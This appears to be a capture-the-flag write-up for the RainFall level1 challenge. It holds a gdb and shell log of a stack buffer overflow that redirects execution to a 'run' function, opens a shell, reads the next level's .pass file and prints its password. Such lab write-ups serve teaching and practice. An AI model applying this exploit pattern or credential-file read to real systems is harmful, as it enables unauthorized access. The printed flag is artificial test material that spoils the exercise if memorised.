TODO explanation
```shell
level1@RainFall:~$ gdb ./level1
[...]
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
[...]
0x08048444  run
0x08048480  main
[...]

(gdb) r <<< `python -c 'import struct; print "A"*76 + struct.pack("<Q", 0x08048444)'`
Starting program: /home/user/level1/level1 <<< `python -c 'import struct; print "A"*76 + struct.pack("<Q", 0x08048444)'`
Good... Wait what?

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb) quit

level1@RainFall:~$ (python -c 'import struct; print "A"*76 + struct.pack("<Q", 0x08048444)'; cat -) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
